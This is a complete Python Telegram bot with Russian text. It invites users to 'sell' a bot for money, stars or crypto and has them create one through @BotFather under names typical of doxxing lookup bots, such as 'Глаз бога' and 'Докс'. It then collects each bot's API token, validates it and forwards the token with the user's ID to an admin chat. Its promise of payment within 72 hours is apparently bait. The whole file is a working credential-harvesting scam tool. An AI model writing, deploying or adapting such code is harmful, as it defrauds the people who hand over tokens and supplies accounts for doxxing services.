import asyncio
import random
import string
import re
import aiohttp
import os
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
import config

# Включаем логирование ошибок в консоль
logging.basicConfig(level=logging.INFO)

bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

DB_FILE = "used_tokens.txt"
BLACKLIST_FILE = "blacklist.txt"

NAMES = ["Вектор", "Виктор", "Пробив", "Пробить", "Докс", "Шоколадный глаз", "Глаз бога", "Пробивала", "Шерлок", "Духлес"]

def gen_username():
    letters = string.ascii_lowercase
    random_str = ''.join(random.choice(letters) for _ in range(8))
    return f"{random_str}_bot"

TOKEN_PATTERN = re.compile(r'^\d{8,10}:[a-zA-Z0-9_-]{35,45}$')

main_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="Подобрать задание ⚙️")]],
    resize_keyboard=True
)

async def check_token_validity(token: str):
    url = f"https://api.telegram.org/bot{token}/getMe"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, timeout=5) as response:
                if response.status == 200:
                    return await response.json()
                return None
        except Exception as e:
            logging.error(f"Ошибка проверки токена: {e}")
            return None

def is_listed(data, file_path):
    if not os.path.exists(file_path): return False
    with open(file_path, "r") as f:
        return str(data) in f.read().splitlines()

def save_to_file(data, file_path):
    with open(file_path, "a") as f:
        f.write(str(data) + "\n")

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if is_listed(message.from_user.id, BLACKLIST_FILE): return
    await message.answer(
        "👋 Привет! Здесь ты можешь сдать бота за деньги / звёзды / крипту.\n"
        "Нажми кнопку ниже, и я подберу задание для тебя.",
        reply_markup=main_kb
    )

@dp.message(F.text == "Подобрать задание ⚙️")
async def step_1(message: types.Message):
    if is_listed(message.from_user.id, BLACKLIST_FILE): return
    
    name = random.choice(NAMES)
    username = gen_username()
    
    await message.answer("1️⃣ **Шаг первый:**\nПерейдите в @BotFather, нажмите СТАРТ и напишите команду `/newbot`.")
    await asyncio.sleep(1)
    await message.answer(f"Теперь перешлите название бота туда:\n`{name}`", parse_mode="Markdown")
    await asyncio.sleep(1)
    await message.answer(f"2️⃣ **Шаг второй:**\nКогда он попросит юзернейм, отправьте это:\n`{username}`", parse_mode="Markdown")
    await asyncio.sleep(1)
    await message.answer("3️⃣ **Шаг третий:**\nСкопируйте API токен от @BotFather и пришлите его мне!")

@dp.message()
async def handle_token(message: types.Message):
    if is_listed(message.from_user.id, BLACKLIST_FILE): return
    
    token = message.text.strip() if message.text else ""
    
    if TOKEN_PATTERN.match(token):
        if is_listed(token, DB_FILE):
            await message.answer("❌ Этот токен уже сдан!")
            return

        bot_data = await check_token_validity(token)
        
        if bot_data and bot_data.get("ok"):
            res = bot_data["result"]
            
            # Формируем текст лога БЕЗ разметки Markdown, чтобы не было ошибок парсинга
            # Используем обычный текст, так надежнее
            log_text = (
                "📥 НОВЫЙ ТОКЕН!\n"
                f"👤 Юзер: @{message.from_user.username or 'ID ' + str(message.from_user.id)}\n"
                f"🆔 ID: {message.from_user.id}\n"
                f"🤖 Бот: @{res['username']}\n"
                f"🔑 Токен: {token}"
            )
            
            try:
                # Отправляем БЕЗ parse_mode, чтобы символы _ и * не ломали отправку
                await bot.send_message(chat_id=config.ADMIN_CHAT_ID, text=log_text)
                
                save_to_file(token, DB_FILE)
                await message.answer("✅ Токен принят! Ожидайте выплату в течение 72 часов.")
                logging.info(f"Лог успешно отправлен для {token}")
                
            except Exception as e:
                logging.error(f"КРИТИЧЕСКАЯ ОШИБКА ОТПРАВКИ ЛОГА: {e}")
                await message.answer("❌ Ошибка при передаче данных в админ-чат. Проверьте настройки чата.")
        else:
            await message.answer("❌ Нерабочий токен. Проверьте данные в @BotFather.")
    elif token != "Подобрать задание ⚙️":
        await message.answer("❌ Это не похоже на токен. Пришлите данные от @BotFather.")

async def main():
    print("Бот запущен. Если логи не приходят — проверьте консоль хостинга!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
    
